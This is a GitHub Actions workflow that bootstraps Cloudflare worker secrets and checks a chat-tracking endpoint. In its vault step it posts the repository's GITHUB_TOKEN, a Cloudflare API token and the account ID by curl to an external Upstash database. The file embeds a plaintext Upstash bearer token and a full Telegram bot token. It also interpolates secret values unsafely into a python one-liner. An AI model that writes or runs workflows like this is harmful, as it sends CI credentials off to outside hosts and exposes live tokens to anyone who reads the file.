name: Bootstrap secrets to workers and vault

on:
  workflow_dispatch:

jobs:
  bootstrap:
    runs-on: ubuntu-latest
    steps:
      - run: npm install -g wrangler@3

      - name: Inject CF_API_TOKEN into genspark-worker
        run: |
          printf '%s' "${{ secrets.CF_API_TOKEN }}" | wrangler secret put CF_API_TOKEN --name genspark-worker
        env:
          CLOUDFLARE_API_TOKEN: ${{ secrets.CF_API_TOKEN }}
          CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CF_ACCOUNT_ID }}

      - name: Inject CF_API_TOKEN into sentinel
        run: |
          printf '%s' "${{ secrets.CF_API_TOKEN }}" | wrangler secret put CF_API_TOKEN --name sentinel
        env:
          CLOUDFLARE_API_TOKEN: ${{ secrets.CF_API_TOKEN }}
          CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CF_ACCOUNT_ID }}

      - name: Save secrets to Upstash vault
        env:
          UPS: https://fresh-walleye-84119.upstash.io
          UT: gQAAAAAAAUiXAAIncDEwMjljNTI2ZGQ5OWQ0OGJlOTFmYWU2YjQ2OGI0NmIyZXAxODQxMTk
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          CF_TOKEN: ${{ secrets.CF_API_TOKEN }}
          CF_ACCOUNT: ${{ secrets.CF_ACCOUNT_ID }}
        run: |
          for key_val in "GITHUB_TOKEN:$GH_TOKEN" "CF_API_TOKEN:$CF_TOKEN" "CF_ACCOUNT_ID:$CF_ACCOUNT"; do
            KEY="${key_val%%:*}"
            VAL="${key_val#*:}"
            curl -sf -X POST "$UPS/set/vault:$KEY/$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote('$VAL'))")" \
              -H "Authorization: Bearer $UT" && echo "vault:$KEY saved" || echo "vault:$KEY failed"
          done

      - name: Verify tracking now works
        run: |
          sleep 5
          RESULT=$(curl -sf --max-time 15 "https://genspark.ofshore.dev/v1/chat" \
            -X POST -H "Content-Type: application/json" \
            -d '{"message":"test tracking"}')
          echo "Chat result: $RESULT" | head -c 200
          
          sleep 3
          STATS=$(curl -sf "https://genspark.ofshore.dev/stats")
          echo "Stats: $STATS" | head -c 200

      - name: Notify
        run: |
          curl -s "https://api.telegram.org/bot8394457153:AAFZQ4eMHaiAnmwejmTfWZHI_5KSqhXgCXg/sendMessage" \
            -d "chat_id=8149345223" \
            --data-urlencode "text=🔑 Secrets bootstrapped!
- CF_API_TOKEN → genspark-worker ✅
- CF_API_TOKEN → sentinel ✅  
- vault:GITHUB_TOKEN saved ✅
- vault:CF_API_TOKEN saved ✅
Tracking usage_stats now active"
